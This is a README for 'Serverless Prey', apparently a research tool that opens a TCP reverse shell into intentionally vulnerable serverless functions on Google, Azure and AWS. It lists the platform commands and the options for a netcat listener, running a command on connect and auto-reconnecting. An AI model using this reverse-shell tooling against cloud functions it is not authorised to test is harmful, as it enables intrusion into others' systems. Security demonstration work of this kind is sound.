# Serverless Prey CLI

This is a command-line interface for establishing a TCP reverse shell connection to a Serverless Prey function. With it, you can accomplish steps 2 through 4 on the below diagram with a single command:

![Diagram](../docs/diagram.png "Diagram")

## Usage

We do not recommend invoking this script directly. Instead, you can use the specific aliases for each platform:

```
cheetah/script/cheetah --url-id GOOGLE_PROJECT_ID
cougar/script/cougar --url-id AZURE_FUNCTION_APP_ID --api-key AZURE_FUNCTION_APP_API_KEY
panther/script/panther --url-id AMAZON_API_GATEWAY_ID --api-key AMAZON_API_GATEWAY_API_KEY
```

### Options

* `--url`, `-u`: The base URL for the vulnerable endpoint. This is the function URL in the Serverless Framework deployment output for Panther and Cheetah, and `http://$COUGAR_FUNCTION_HOST/api/Cougar` for Cougar.
* `--api-key`, `-a`: The API key for the function. This is required for all platforms except for Google (Cheetah).
* `--port`, `-p` (Optional): The port that the Netcat server will listen on. Defaults to 4444.
* `--region`, `-r` (Optional): The region in which the function is hosted. Defaults to `us-central1` for Google (Cheetah) and `us-east-1` for AWS (Panther). You do not need to provide the region in the request for Azure Function Apps, so this is not needed for Cougar.
* `--command`, `-c` (Optional): If provided, this command will be executed as soon as the connection to the Serverless container is established. The connection will be terminated one second later, and the results will be displayed. Example: `panther/script/panther --url-id AMAZON_API_GATEWAY_ID --api-key AMAZON_API_GATEWAY_API_KEY --command id # uid=496(sbx_user1051) gid=495 groups=495`
* `--loop`, `-l` (Optional): If set to true, whenever a successful connection times out, the CLI will attempt to automatically reconnect. This option is ignored if `--command` is set.
